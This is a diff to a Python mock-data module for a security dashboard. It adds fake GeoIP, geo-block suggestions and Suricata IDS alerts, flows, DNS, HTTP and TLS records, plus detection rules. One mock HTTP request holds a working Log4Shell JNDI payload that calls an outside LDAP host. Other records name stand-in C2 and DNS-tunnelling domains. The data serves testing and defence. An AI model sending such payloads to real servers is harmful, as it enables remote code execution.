@@ -901,6 +901,21 @@ es un ataque de fuerza bruta sostenido desde <code>203.0.113.45</code> contra
                 "is_new": True,
             }
 
+        @staticmethod
+        def suricata_alert_tick(tick: int) -> dict | None:
+            """Emit a Suricata alert every ~4 ticks (~20s at 5s/tick).
+            Rotates through the alert pool with a fresh timestamp.
+            Returns None on non-emitting ticks.
+            """
+            if tick % 4 != 0:
+                return None
+            alerts_pool = _SURICATA_ALERTS
+            idx = (tick // 4) % len(alerts_pool)
+            alert = dict(alerts_pool[idx])
+            alert["id"] = f"ws-sur-{tick:05d}"
+            alert["timestamp"] = datetime.now(timezone.utc).isoformat()
+            return alert
+
 
 # ── CrowdSec Mock Data ────────────────────────────────────────────────────────
 
@@ -1463,3 +1478,1276 @@ class _CrowdSecMockData:
 # Attach as class-level attribute so usage is MockData.crowdsec.decisions()
 MockData.crowdsec = _CrowdSecMockData
 
+
+
+# ── GeoIP Mock Data ───────────────────────────────────────────────────────────
+#
+# Datos coherentes con las IPs de CrowdSec, Wazuh y MikroTik.
+# IPs locales → country_code="LOCAL".
+
+_GEOIP_DATA: dict[str, dict] = {
+    "203.0.113.45": {
+        "country_code": "CN", "country_name": "China",
+        "city": "Beijing", "latitude": 39.9042, "longitude": 116.4074,
+        "asn": 4134, "as_name": "AS4134 Chinanet",
+        "network_type": "ISP", "is_datacenter": False, "is_tor": False,
+    },
+    "198.51.100.22": {
+        "country_code": "RU", "country_name": "Russia",
+        "city": "Moscow", "latitude": 55.7558, "longitude": 37.6173,
+        "asn": 8359, "as_name": "AS8359 MTS PJSC",
+        "network_type": "ISP", "is_datacenter": False, "is_tor": False,
+    },
+    "185.220.101.50": {
+        "country_code": "DE", "country_name": "Germany",
+        "city": "Frankfurt", "latitude": 50.1109, "longitude": 8.6821,
+        "asn": 60729, "as_name": "AS60729 Tor Exit Node",
+        "network_type": "Hosting", "is_datacenter": True, "is_tor": True,
+    },
+    "45.142.212.100": {
+        "country_code": "NL", "country_name": "Netherlands",
+        "city": "Amsterdam", "latitude": 52.3676, "longitude": 4.9041,
+        "asn": 206728, "as_name": "AS206728 Media Land LLC",
+        "network_type": "Hosting", "is_datacenter": True, "is_tor": False,
+    },
+    "91.108.56.130": {
+        "country_code": "UA", "country_name": "Ukraine",
+        "city": "Kyiv", "latitude": 50.4501, "longitude": 30.5234,
+        "asn": 57024, "as_name": "AS57024 Aeroflot Digital",
+        "network_type": "Business", "is_datacenter": False, "is_tor": False,
+    },
+    "177.21.52.88": {
+        "country_code": "BR", "country_name": "Brazil",
+        "city": "Sao Paulo", "latitude": -23.5505, "longitude": -46.6333,
+        "asn": 27699, "as_name": "AS27699 TELEFONICA BRASIL",
+        "network_type": "ISP", "is_datacenter": False, "is_tor": False,
+    },
+    "5.188.206.45": {
+        "country_code": "RU", "country_name": "Russia",
+        "city": "Saint Petersburg", "latitude": 59.9311, "longitude": 30.3609,
+        "asn": 35470, "as_name": "AS35470 Serverius LLC",
+        "network_type": "Hosting", "is_datacenter": True, "is_tor": False,
+    },
+    "103.45.67.209": {
+        "country_code": "IN", "country_name": "India",
+        "city": "Mumbai", "latitude": 19.0760, "longitude": 72.8777,
+        "asn": 38266, "as_name": "AS38266 Vodafone India",
+        "network_type": "ISP", "is_datacenter": False, "is_tor": False,
+    },
+    "203.0.113.99": {
+        "country_code": "CN", "country_name": "China",
+        "city": "Shanghai", "latitude": 31.2304, "longitude": 121.4737,
+        "asn": 4812, "as_name": "AS4812 China Telecom",
+        "network_type": "ISP", "is_datacenter": False, "is_tor": False,
+    },
+}
+
+_GEOIP_DEFAULT = {
+    "country_code": "UNKNOWN", "country_name": "Unknown",
+    "city": None, "latitude": None, "longitude": None,
+    "asn": None, "as_name": None,
+    "network_type": None, "is_datacenter": False, "is_tor": False,
+}
+
+_GEOIP_LOCAL = {
+    "country_code": "LOCAL", "country_name": "Red Local",
+    "city": None, "latitude": None, "longitude": None,
+    "asn": None, "as_name": None,
+    "network_type": "Local", "is_datacenter": False, "is_tor": False,
+}
+
+
+def _is_private_ip(ip: str) -> bool:
+    """True si la IP pertenece a un rango privado (RFC 1918 / loopback)."""
+    parts = ip.split(".")
+    if len(parts) != 4:
+        return False
+    try:
+        a, b = int(parts[0]), int(parts[1])
+    except ValueError:
+        return False
+    return (
+        a == 10
+        or (a == 172 and 16 <= b <= 31)
+        or (a == 192 and b == 168)
+        or a == 127
+    )
+
+
+class _GeoIPMockData:
+    """GeoIP mock data namespace, attached as MockData.geoip."""
+
+    @staticmethod
+    def lookup(ip: str) -> dict:
+        """Return mock GeoIP result for a single IP."""
+        if _is_private_ip(ip):
+            return {"ip": ip, "raw_available": False, **_GEOIP_LOCAL}
+        result = _GEOIP_DATA.get(ip, _GEOIP_DEFAULT)
+        return {"ip": ip, "raw_available": False, **result}
+
+    @staticmethod
+    def lookup_bulk(ips: list[str]) -> list[dict]:
+        """Return mock GeoIP results for a list of IPs (deduped)."""
+        seen: set[str] = set()
+        results = []
+        for ip in ips:
+            if ip not in seen:
+                seen.add(ip)
+                results.append(_GeoIPMockData.lookup(ip))
+        return results
+
+    @staticmethod
+    def top_countries(limit: int = 10, source: str = "all") -> dict:
+        """Aggregated top attacking countries (mock -- crosses CrowdSec + Wazuh)."""
+        countries = [
+            {
+                "country_code": "CN", "country_name": "China",
+                "count": 18, "percentage": 35.3,
+                "sources": {"crowdsec": 12, "wazuh": 5, "mikrotik": 1},
+                "top_asns": ["AS4134 Chinanet", "AS4812 China Telecom"],
+            },
+            {
+                "country_code": "RU", "country_name": "Russia",
+                "count": 14, "percentage": 27.5,
+                "sources": {"crowdsec": 9, "wazuh": 4, "mikrotik": 1},
+                "top_asns": ["AS8359 MTS PJSC", "AS35470 Serverius LLC"],
+            },
+            {
+                "country_code": "DE", "country_name": "Germany",
+                "count": 7, "percentage": 13.7,
+                "sources": {"crowdsec": 7, "wazuh": 0, "mikrotik": 0},
+                "top_asns": ["AS60729 Tor Exit Node"],
+            },
+            {
+                "country_code": "NL", "country_name": "Netherlands",
+                "count": 6, "percentage": 11.8,
+                "sources": {"crowdsec": 5, "wazuh": 1, "mikrotik": 0},
+                "top_asns": ["AS206728 Media Land LLC"],
+            },
+            {
+                "country_code": "IN", "country_name": "India",
+                "count": 3, "percentage": 5.9,
+                "sources": {"crowdsec": 2, "wazuh": 1, "mikrotik": 0},
+                "top_asns": ["AS38266 Vodafone India"],
+            },
+            {
+                "country_code": "BR", "country_name": "Brazil",
+                "count": 2, "percentage": 3.9,
+                "sources": {"crowdsec": 2, "wazuh": 0, "mikrotik": 0},
+                "top_asns": ["AS27699 TELEFONICA BRASIL"],
+            },
+            {
+                "country_code": "UA", "country_name": "Ukraine",
+                "count": 1, "percentage": 2.0,
+                "sources": {"crowdsec": 1, "wazuh": 0, "mikrotik": 0},
+                "top_asns": ["AS57024 Aeroflot Digital"],
+            },
+        ]
+        return {
+            "countries": countries[:limit],
+            "total_ips": 51,
+            "source": source,
+            "generated_at": _NOW.isoformat(),
+        }
+
+    @staticmethod
+    def top_asns(limit: int = 10) -> dict:
+        """Top attacking ASNs ranked by IP count."""
+        asns = [
+            {"asn": 4134,   "as_name": "AS4134 Chinanet",          "country_code": "CN", "count": 10, "is_datacenter": False},
+            {"asn": 8359,   "as_name": "AS8359 MTS PJSC",           "country_code": "RU", "count": 8,  "is_datacenter": False},
+            {"asn": 60729,  "as_name": "AS60729 Tor Exit Node",     "country_code": "DE", "count": 7,  "is_datacenter": True},
+            {"asn": 206728, "as_name": "AS206728 Media Land LLC",   "country_code": "NL", "count": 6,  "is_datacenter": True},
+            {"asn": 35470,  "as_name": "AS35470 Serverius LLC",     "country_code": "RU", "count": 5,  "is_datacenter": True},
+            {"asn": 38266,  "as_name": "AS38266 Vodafone India",    "country_code": "IN", "count": 3,  "is_datacenter": False},
+            {"asn": 27699,  "as_name": "AS27699 TELEFONICA BRASIL", "country_code": "BR", "count": 2,  "is_datacenter": False},
+        ]
+        return {
+            "asns": asns[:limit],
+            "total_ips": 41,
+            "generated_at": _NOW.isoformat(),
+        }
+
+    @staticmethod
+    def geo_block_suggestions() -> list[dict]:
+        """Automatic geo-block suggestions based on threat intelligence."""
+        return [
+            {
+                "id": "block-cn",
+                "type": "country",
+                "target": "CN",
+                "target_name": "China",
+                "reason": "18 IPs bloqueadas por CrowdSec + 5 alertas Wazuh SSH brute-force en las ultimas 24h",
+                "evidence": {
+                    "crowdsec_ips": ["203.0.113.45", "203.0.113.99"],
+                    "wazuh_alerts": 45,
+                    "affected_agents": ["lubuntu_desk_1", "lubuntu_desk_2"],
+                },
+                "risk_level": "high",
+                "estimated_block_count": 18,
+                "suggested_duration": "24h",
+            },
+            {
+                "id": "block-ru",
+                "type": "country",
+                "target": "RU",
+                "target_name": "Russia",
+                "reason": "14 IPs con decisiones activas CrowdSec -- SSH brute-force y port scanning",
+                "evidence": {
+                    "crowdsec_ips": ["198.51.100.22", "5.188.206.45"],
+                    "wazuh_alerts": 22,
+                    "affected_agents": ["lubuntu_desk_2"],
+                },
+                "risk_level": "high",
+                "estimated_block_count": 14,
+                "suggested_duration": "48h",
+            },
+            {
+                "id": "block-as60729",
+                "type": "asn",
+                "target": "AS60729",
+                "target_name": "AS60729 Tor Exit Node",
+                "reason": "7 IPs Tor identificadas -- background noise alto, HTTP probing continuo",
+                "evidence": {
+                    "crowdsec_ips": ["185.220.101.50"],
+                    "wazuh_alerts": 85,
+                    "affected_agents": [],
+                },
+                "risk_level": "medium",
+                "estimated_block_count": 7,
+                "suggested_duration": "7d",
+            },
+        ]
+
+    @staticmethod
+    def db_status() -> dict:
+        """Status of the GeoLite2 database files (mock mode = not loaded)."""
+        return {
+            "city_db": {
+                "loaded": False,
+                "path": "backend/data/geoip/GeoLite2-City.mmdb",
+                "build_epoch": None,
+                "description": "GeoLite2-City -- not downloaded",
+            },
+            "asn_db": {
+                "loaded": False,
+                "path": "backend/data/geoip/GeoLite2-ASN.mmdb",
+                "build_epoch": None,
+                "description": "GeoLite2-ASN -- not downloaded",
+            },
+            "mock_mode": True,
+            "cache_size": 0,
+            "cache_ttl_seconds": 3600,
+        }
+
+
+
+# Attach as class-level attribute so usage is MockData.geoip.lookup(ip)
+MockData.geoip = _GeoIPMockData
+
+
+# ── Suricata Mock Data ────────────────────────────────────────────────────────
+# Coherencia con mock existente:
+#   203.0.113.45  → atacante brute-force (Wazuh + CrowdSec + MikroTik)
+#   198.51.100.22 → atacante port-scan (Wazuh + CrowdSec + MikroTik)
+#   45.142.212.100 → atacante CrowdSec-only (ahora también detectado por Suricata)
+#   172.16.200.5  → lateral movement (solo Suricata — interno sospechoso)
+
+_SURICATA_ALERTS = [
+    {
+        "id": "sur-0001",
+        "timestamp": _ts(3),
+        "signature_id": 2001219,
+        "signature": "ET SCAN Potential SSH Scan",
+        "category": "Attempted Information Leak",
+        "severity": 2,
+        "protocol": "TCP",
+        "src_ip": "198.51.100.22",
+        "src_port": 54321,
+        "dst_ip": "192.168.88.50",
+        "dst_port": 22,
+        "action": "alert",
+        "flow_id": "flow-001",
+        "app_proto": "ssh",
+        "mitre_technique": "T1046",
+        "mitre_name": "Network Service Discovery",
+        "wazuh_alert_id": "mock-00012",
+        "crowdsec_decision_id": "cs-2",
+        "geo": {"country": "RU", "country_name": "Russia", "as_name": "AS8359 MTS PJSC"},
+    },
+    {
+        "id": "sur-0002",
+        "timestamp": _ts(7),
+        "signature_id": 2006546,
+        "signature": "ET POLICY SSH session in progress on Expected Port",
+        "category": "Misc Activity",
+        "severity": 3,
+        "protocol": "TCP",
+        "src_ip": "203.0.113.45",
+        "src_port": 50234,
+        "dst_ip": "192.168.88.10",
+        "dst_port": 22,
+        "action": "alert",
+        "flow_id": "flow-002",
+        "app_proto": "ssh",
+        "mitre_technique": "T1110",
+        "mitre_name": "Brute Force",
+        "wazuh_alert_id": "mock-00000",
+        "crowdsec_decision_id": "cs-1",
+        "geo": {"country": "CN", "country_name": "China", "as_name": "AS4134 Chinanet"},
+    },
+    {
+        "id": "sur-0003",
+        "timestamp": _ts(12),
+        "signature_id": 2008581,
+        "signature": "ET EXPLOIT Possible CVE-2021-44228 Log4j RCE Inbound",
+        "category": "Attempted Administrator Privilege Gain",
+        "severity": 1,
+        "protocol": "TCP",
+        "src_ip": "45.142.212.100",
+        "src_port": 8443,
+        "dst_ip": "192.168.88.50",
+        "dst_port": 8080,
+        "action": "drop",
+        "flow_id": "flow-003",
+        "app_proto": "http",
+        "mitre_technique": "T1190",
+        "mitre_name": "Exploit Public-Facing Application",
+        "wazuh_alert_id": None,
+        "crowdsec_decision_id": "cs-4",
+        "geo": {"country": "NL", "country_name": "Netherlands", "as_name": "AS206728 Media Land LLC"},
+    },
+    {
+        "id": "sur-0004",
+        "timestamp": _ts(18),
+        "signature_id": 2019284,
+        "signature": "ET MALWARE Possible Lateral Movement - SMB to Multiple Internal Hosts",
+        "category": "A Network Trojan was Detected",
+        "severity": 1,
+        "protocol": "TCP",
+        "src_ip": "172.16.200.5",
+        "src_port": 445,
+        "dst_ip": "192.168.88.10",
+        "dst_port": 445,
+        "action": "alert",
+        "flow_id": "flow-004",
+        "app_proto": "smb",
+        "mitre_technique": "T1021",
+        "mitre_name": "Remote Services",
+        "wazuh_alert_id": None,
+        "crowdsec_decision_id": None,
+        "geo": None,
+    },
+    {
+        "id": "sur-0005",
+        "timestamp": _ts(25),
+        "signature_id": 2014726,
+        "signature": "ET DNS Query for .onion proxy Domain (tor2web.org)",
+        "category": "Potentially Bad Traffic",
+        "severity": 2,
+        "protocol": "UDP",
+        "src_ip": "192.168.88.20",
+        "src_port": 49200,
+        "dst_ip": "8.8.8.8",
+        "dst_port": 53,
+        "action": "alert",
+        "flow_id": "flow-005",
+        "app_proto": "dns",
+        "mitre_technique": "T1090",
+        "mitre_name": "Proxy",
+        "wazuh_alert_id": None,
+        "crowdsec_decision_id": None,
+        "geo": None,
+    },
+    {
+        "id": "sur-0006",
+        "timestamp": _ts(30),
+        "signature_id": 2009582,
+        "signature": "ET SCAN NMAP -sA packet Scan",
+        "category": "Attempted Information Leak",
+        "severity": 2,
+        "protocol": "TCP",
+        "src_ip": "198.51.100.22",
+        "src_port": 54400,
+        "dst_ip": "192.168.88.1",
+        "dst_port": 80,
+        "action": "alert",
+        "flow_id": "flow-006",
+        "app_proto": "http",
+        "mitre_technique": "T1046",
+        "mitre_name": "Network Service Discovery",
+        "wazuh_alert_id": "mock-00006",
+        "crowdsec_decision_id": "cs-2",
+        "geo": {"country": "RU", "country_name": "Russia", "as_name": "AS8359 MTS PJSC"},
+    },
+    {
+        "id": "sur-0007",
+        "timestamp": _ts(42),
+        "signature_id": 2016141,
+        "signature": "ET MALWARE CryptBot Loader HTTP GET",
+        "category": "A Network Trojan was Detected",
+        "severity": 1,
+        "protocol": "TCP",
+        "src_ip": "192.168.88.10",
+        "src_port": 49300,
+        "dst_ip": "203.0.113.99",
+        "dst_port": 443,
+        "action": "alert",
+        "flow_id": "flow-007",
+        "app_proto": "tls",
+        "mitre_technique": "T1071",
+        "mitre_name": "Application Layer Protocol",
+        "wazuh_alert_id": "mock-00005",
+        "crowdsec_decision_id": None,
+        "geo": {"country": "US", "country_name": "United States", "as_name": "AS30083 Cloudflare"},
+    },
+    {
+        "id": "sur-0008",
+        "timestamp": _ts(55),
+        "signature_id": 2101411,
+        "signature": "GPL SNMP public access udp",
+        "category": "Attempted Information Leak",
+        "severity": 2,
+        "protocol": "UDP",
+        "src_ip": "198.51.100.22",
+        "src_port": 161,
+        "dst_ip": "192.168.88.1",
+        "dst_port": 161,
+        "action": "alert",
+        "flow_id": "flow-008",
+        "app_proto": None,
+        "mitre_technique": "T1046",
+        "mitre_name": "Network Service Discovery",
+        "wazuh_alert_id": None,
+        "crowdsec_decision_id": "cs-2",
+        "geo": {"country": "RU", "country_name": "Russia", "as_name": "AS8359 MTS PJSC"},
+    },
+]
+
+_SURICATA_FLOWS = [
+    {
+        "id": "flow-001", "timestamp": _ts(3), "protocol": "TCP",
+        "src_ip": "198.51.100.22", "src_port": 54321,
+        "dst_ip": "192.168.88.50", "dst_port": 22,
+        "bytes_toserver": 2048, "bytes_toclient": 512,
+        "pkts_toserver": 12, "pkts_toclient": 4,
+        "app_proto": "ssh", "state": "established",
+        "duration_ms": 3400, "has_alert": True,
+    },
+    {
+        "id": "flow-002", "timestamp": _ts(7), "protocol": "TCP",
+        "src_ip": "203.0.113.45", "src_port": 50234,
+        "dst_ip": "192.168.88.10", "dst_port": 22,
+        "bytes_toserver": 1200, "bytes_toclient": 800,
+        "pkts_toserver": 8, "pkts_toclient": 6,
+        "app_proto": "ssh", "state": "closed",
+        "duration_ms": 1800, "has_alert": True,
+    },
+    {
+        "id": "flow-003", "timestamp": _ts(12), "protocol": "TCP",
+        "src_ip": "45.142.212.100", "src_port": 8443,
+        "dst_ip": "192.168.88.50", "dst_port": 8080,
+        "bytes_toserver": 850, "bytes_toclient": 0,
+        "pkts_toserver": 5, "pkts_toclient": 0,
+        "app_proto": "http", "state": "new",
+        "duration_ms": 250, "has_alert": True,
+    },
+    {
+        "id": "flow-010", "timestamp": _ts(1), "protocol": "TCP",
+        "src_ip": "192.168.88.11", "src_port": 52000,
+        "dst_ip": "8.8.8.8", "dst_port": 443,
+        "bytes_toserver": 12400, "bytes_toclient": 98000,
+        "pkts_toserver": 45, "pkts_toclient": 120,
+        "app_proto": "tls", "state": "established",
+        "duration_ms": 45000, "has_alert": False,
+    },
+    {
+        "id": "flow-011", "timestamp": _ts(2), "protocol": "TCP",
+        "src_ip": "192.168.88.20", "src_port": 53100,
+        "dst_ip": "192.168.88.50", "dst_port": 55000,
+        "bytes_toserver": 3200, "bytes_toclient": 15600,
+        "pkts_toserver": 22, "pkts_toclient": 88,
+        "app_proto": "http", "state": "established",
+        "duration_ms": 12000, "has_alert": False,
+    },
+]
+
+_SURICATA_DNS_QUERIES = [
+    {
+        "id": "dns-001", "timestamp": _ts(5), "src_ip": "192.168.88.20",
+        "src_port": 49200, "dst_ip": "8.8.8.8", "dst_port": 53,
+        "query": "tor2web.org", "type": "A", "response": "NXDOMAIN",
+        "is_suspicious": True, "flow_id": "flow-005",
+    },
+    {
+        "id": "dns-002", "timestamp": _ts(8), "src_ip": "192.168.88.10",
+        "src_port": 50100, "dst_ip": "8.8.8.8", "dst_port": 53,
+        "query": "malware-c2.net", "type": "A", "response": "127.0.0.1",
+        "is_suspicious": True, "flow_id": "flow-012",
+    },
+    {
+        "id": "dns-003", "timestamp": _ts(10), "src_ip": "192.168.88.11",
+        "src_port": 50200, "dst_ip": "8.8.8.8", "dst_port": 53,
+        "query": "google.com", "type": "A", "response": "142.250.80.46",
+        "is_suspicious": False, "flow_id": "flow-013",
+    },
+    {
+        "id": "dns-004", "timestamp": _ts(15), "src_ip": "192.168.88.20",
+        "src_port": 50300, "dst_ip": "8.8.8.8", "dst_port": 53,
+        "query": "aabbccddee.dnscat.example.com", "type": "TXT", "response": "",
+        "is_suspicious": True, "flow_id": "flow-014",
+    },
+    {
+        "id": "dns-005", "timestamp": _ts(20), "src_ip": "192.168.88.50",
+        "src_port": 50400, "dst_ip": "8.8.8.8", "dst_port": 53,
+        "query": "ubuntu.com", "type": "A", "response": "185.125.190.20",
+        "is_suspicious": False, "flow_id": "flow-015",
+    },
+]
+
+_SURICATA_HTTP_TRANSACTIONS = [
+    {
+        "id": "http-001", "timestamp": _ts(12), "src_ip": "45.142.212.100",
+        "dst_ip": "192.168.88.50", "dst_port": 8080,
+        "hostname": "192.168.88.50", "url": "/?x=${jndi:ldap://45.142.212.100/exp}",
+        "method": "GET", "status": 400,
+        "user_agent": "Mozilla/5.0 (Java Log4Shell exploit)",
+        "content_type": "", "response_bytes": 0,
+        "is_suspicious": True, "flow_id": "flow-003",
+    },
+    {
+        "id": "http-002", "timestamp": _ts(20), "src_ip": "192.168.88.10",
+        "dst_ip": "203.0.113.99", "dst_port": 80,
+        "hostname": "evil-phishing.com", "url": "/login",
+        "method": "GET", "status": 200,
+        "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+        "content_type": "text/html", "response_bytes": 4500,
+        "is_suspicious": True, "flow_id": "flow-016",
+    },
+    {
+        "id": "http-003", "timestamp": _ts(25), "src_ip": "192.168.88.11",
+        "dst_ip": "8.8.8.8", "dst_port": 80,
+        "hostname": "detectportal.firefox.com", "url": "/success.txt",
+        "method": "GET", "status": 200,
+        "user_agent": "Mozilla/5.0 Firefox/115.0",
+        "content_type": "text/plain", "response_bytes": 8,
+        "is_suspicious": False, "flow_id": "flow-017",
+    },
+    {
+        "id": "http-004", "timestamp": _ts(35), "src_ip": "198.51.100.22",
+        "dst_ip": "192.168.88.50", "dst_port": 55000,
+        "hostname": "192.168.88.50", "url": "/api/v2/agents",
+        "method": "GET", "status": 401,
+        "user_agent": "python-requests/2.28.0",
+        "content_type": "application/json", "response_bytes": 120,
+        "is_suspicious": True, "flow_id": "flow-018",
+    },
+]
+
+_SURICATA_TLS_HANDSHAKES = [
+    {
+        "id": "tls-001", "timestamp": _ts(7), "src_ip": "192.168.88.10",
+        "dst_ip": "203.0.113.45", "dst_port": 443,
+        "sni": "203.0.113.45", "version": "TLS 1.2",
+        "ja3": "769,47-53-5-10,0-65281,0-23-65281", "ja3s": None,
+        "is_suspicious": True, "flow_id": "flow-019",
+    },
+    {
+        "id": "tls-002", "timestamp": _ts(15), "src_ip": "192.168.88.11",
+        "dst_ip": "8.8.8.8", "dst_port": 443,
+        "sni": "google.com", "version": "TLS 1.3",
+        "ja3": "771,4865-4866-4867-49195-49199,0-23-65281-43-51,29-23-24",
+        "ja3s": None, "is_suspicious": False, "flow_id": "flow-010",
+    },
+    {
+        "id": "tls-003", "timestamp": _ts(42), "src_ip": "192.168.88.10",
+        "dst_ip": "203.0.113.99", "dst_port": 443,
+        "sni": "malware-c2.net", "version": "TLS 1.2",
+        "ja3": "769,47-53-5-10,0-65281,0-23-65281", "ja3s": None,
+        "is_suspicious": True, "flow_id": "flow-007",
+    },
+]
+
+_SURICATA_RULES = [
+    {
+        "sid": 2001219, "enabled": True, "ruleset": "emerging-threats-open",
+        "category": "ET SCAN",
+        "rule": 'alert tcp any any -> $HOME_NET 22 (msg:"ET SCAN Potential SSH Scan"; flow:to_server; flags:S; threshold: type both, track by_src, count 5, seconds 120; classtype:attempted-recon; sid:2001219; rev:6;)',
+        "hits_total": 145, "hits_last_hour": 12, "last_hit": _ts(3),
+    },
+    {
+        "sid": 2008581, "enabled": True, "ruleset": "emerging-threats-open",
+        "category": "ET EXPLOIT",
+        "rule": 'alert http any any -> $HTTP_SERVERS any (msg:"ET EXPLOIT Possible CVE-2021-44228 Log4j RCE Inbound"; flow:established,to_server; content:"${jndi:"; nocase; http_uri; classtype:attempted-admin; sid:2008581; rev:5;)',
+        "hits_total": 3, "hits_last_hour": 1, "last_hit": _ts(12),
+    },
+    {
+        "sid": 2014726, "enabled": True, "ruleset": "emerging-threats-open",
+        "category": "ET DNS",
+        "rule": 'alert dns any any -> any any (msg:"ET DNS Query for .onion proxy Domain (tor2web.org)"; dns.query; content:"tor2web.org"; nocase; classtype:bad-unknown; sid:2014726; rev:5;)',
+        "hits_total": 8, "hits_last_hour": 1, "last_hit": _ts(25),
+    },
+    {
+        "sid": 2019284, "enabled": True, "ruleset": "emerging-threats-open",
+        "category": "ET MALWARE",
+        "rule": 'alert smb any any -> $HOME_NET any (msg:"ET MALWARE Possible Lateral Movement - SMB to Multiple Internal Hosts"; flow:to_server,established; classtype:trojan-activity; sid:2019284; rev:3;)',
+        "hits_total": 1, "hits_last_hour": 1, "last_hit": _ts(18),
+    },
+    {
+        "sid": 2006546, "enabled": True, "ruleset": "emerging-threats-open",
+        "category": "ET POLICY",
+        "rule": 'alert tcp any any -> $HOME_NET 22 (msg:"ET POLICY SSH session in progress on Expected Port"; flow:established; classtype:policy-violation; sid:2006546; rev:3;)',
+        "hits_total": 234, "hits_last_hour": 4, "last_hit": _ts(7),
+    },
+    {
+        "sid": 9000001, "enabled": False, "ruleset": "local",
+        "category": "LOCAL",
+        "rule": 'alert icmp any any -> $HOME_NET any (msg:"LOCAL ICMP ping detected"; itype:8; classtype:misc-activity; sid:9000001; rev:1;)',
+        "hits_total": 0, "hits_last_hour": 0, "last_hit": None,
+    },
+]
+
+_SURICATA_RULESETS = [
+    {
+        "name": "emerging-threats-open",
+        "description": "Emerging Threats Open Ruleset — comunidad libre",
+        "rules_count": 42892,
+        "enabled_count": 8741,
+        "last_updated": _ts(24 * 60),
+        "version": "7.0.4-20240415",
+        "is_active": True,
+    },
+    {
+        "name": "local",
+        "description": "Reglas locales personalizadas del laboratorio",
+        "rules_count": 12,
+        "enabled_count": 8,
+        "last_updated": _ts(72 * 60),
+        "version": "local-1.0",
+        "is_active": True,
+    },
+    {
+        "name": "emerging-threats-pro",
+        "description": "Emerging Threats PRO (requiere licencia)",
+        "rules_count": 0,
+        "enabled_count": 0,
+        "last_updated": None,
+        "version": None,
+        "is_active": False,
+    },
+]
+
+
+class _SuricataMockData:
+    """Mock data para Suricata IDS/IPS/NSM.\n\n    Coherente con entidades existentes:\n    - 203.0.113.45  → brute-force (IPs reusadas de _ATTACKERS)\n    - 198.51.100.22 → port-scan\n    - 45.142.212.100 → Log4j exploit\n    - 172.16.200.5  → lateral movement interno\n    """
+
+    @staticmethod
+    def engine_stats() -> dict:
+        """Estado del motor Suricata."""
+        return {
+            "running": True,
+            "mode": "ids",  # "ids", "ips", "nsm"
+            "version": "7.0.4",
+            "uptime_seconds": 3 * 24 * 3600 + 12 * 3600 + 45 * 60,
+            "uptime_label": "3d 12h 45m",
+            "threads": {
+                "detect": 4,
+                "output": 2,
+                "capture": 1,
+            },
+            "packets_captured": 14_523_891,
+            "packets_decoded": 14_522_108,
+            "packets_dropped": 1_783,
+            "alerts_total": 42,
+            "flows_active": 187,
+            "bytes_processed": 9_823_456_789,
+            "interface": "ether1",
+            "rules_loaded": 8_741,
+            "rules_failed": 0,
+            "last_reload": _ts(24 * 60),
+            "mock": True,
+        }
+
+    @staticmethod
+    def alerts(
+        limit: int = 50,
+        src_ip: str | None = None,
+        dst_ip: str | None = None,
+        category: str | None = None,
+        severity: int | None = None,
+        offset: int = 0,
+    ) -> list[dict]:
+        """Alertas IDS/IPS de Suricata."""
+        result = list(_SURICATA_ALERTS)
+        if src_ip:
+            result = [a for a in result if a["src_ip"] == src_ip]
+        if dst_ip:
+            result = [a for a in result if a["dst_ip"] == dst_ip]
+        if category:
+            result = [a for a in result if category.lower() in a["category"].lower()]
+        if severity is not None:
+            result = [a for a in result if a["severity"] == severity]
+        return result[offset: offset + limit]
+
+    @staticmethod
+    def alert_detail(alert_id: str) -> dict | None:
+        """Detalle completo de una alerta."""
+        return next((a for a in _SURICATA_ALERTS if a["id"] == alert_id), None)
+
+    @staticmethod
+    def alerts_timeline(minutes: int = 120) -> list[dict]:
+        """Serie temporal de alertas por minuto (últimos N minutos)."""
+        _r = _random_module.Random(12345)
+        result = []
+        for i in range(minutes):
+            t = _NOW - timedelta(minutes=minutes - i)
+            # Spikes coherentes con fases de ataque
+            count_ids = _r.randint(0, 2)
+            count_ips = 0
+            if i in (15, 16, 30, 52, 53):
+                count_ids += _r.randint(4, 8)
+                count_ips += _r.randint(1, 2)
+            result.append({
+                "minute": t.strftime("%Y-%m-%dT%H:%M:00"),
+                "count_ids": count_ids,
+                "count_ips": count_ips,
+            })
+        return result
+
+    @staticmethod
+    def top_signatures(limit: int = 10) -> list[dict]:
+        """Top firmas por número de hits."""
+        return [
+            {"sid": 2001219, "signature": "ET SCAN Potential SSH Scan",
+             "category": "ET SCAN", "hits": 145, "last_hit": _ts(3)},
+            {"sid": 2006546, "signature": "ET POLICY SSH session in progress on Expected Port",
+             "category": "ET POLICY", "hits": 234, "last_hit": _ts(7)},
+            {"sid": 2009582, "signature": "ET SCAN NMAP -sA packet Scan",
+             "category": "ET SCAN", "hits": 22, "last_hit": _ts(30)},
+            {"sid": 2014726, "signature": "ET DNS Query for .onion proxy Domain (tor2web.org)",
+             "category": "ET DNS", "hits": 8, "last_hit": _ts(25)},
+            {"sid": 2008581, "signature": "ET EXPLOIT Possible CVE-2021-44228 Log4j RCE Inbound",
+             "category": "ET EXPLOIT", "hits": 3, "last_hit": _ts(12)},
+            {"sid": 2019284, "signature": "ET MALWARE Possible Lateral Movement",
+             "category": "ET MALWARE", "hits": 1, "last_hit": _ts(18)},
+        ][:limit]
+
+    @staticmethod
+    def categories() -> list[dict]:
+        """Distribución de alertas por categoría (para donut chart)."""
+        return [
+            {"category": "Attempted Information Leak", "count": 25, "color": "#f59e0b"},
+            {"category": "A Network Trojan was Detected", "count": 8, "color": "#ef4444"},
+            {"category": "Attempted Administrator Privilege Gain", "count": 4, "color": "#dc2626"},
+            {"category": "Potentially Bad Traffic", "count": 3, "color": "#f97316"},
+            {"category": "Misc Activity", "count": 2, "color": "#6b7280"},
+        ]
+
+    @staticmethod
+    def flows(
+        limit: int = 50,
+        src_ip: str | None = None,
+        proto: str | None = None,
+        app_proto: str | None = None,
+        has_alert: bool | None = None,
+        offset: int = 0,
+    ) -> list[dict]:
+        """Flujos de red NSM."""
+        result = list(_SURICATA_FLOWS)
+        if src_ip:
+            result = [f for f in result if f["src_ip"] == src_ip]
+        if proto:
+            result = [f for f in result if f["protocol"].upper() == proto.upper()]
+        if app_proto:
+            result = [f for f in result if f.get("app_proto") == app_proto]
+        if has_alert is not None:
+            result = [f for f in result if f["has_alert"] == has_alert]
+        return result[offset: offset + limit]
+
+    @staticmethod
+    def flows_stats() -> dict:
+        """Estadísticas agregadas de flujos."""
+        return {
+            "total_flows": 4821,
+            "active_flows": 187,
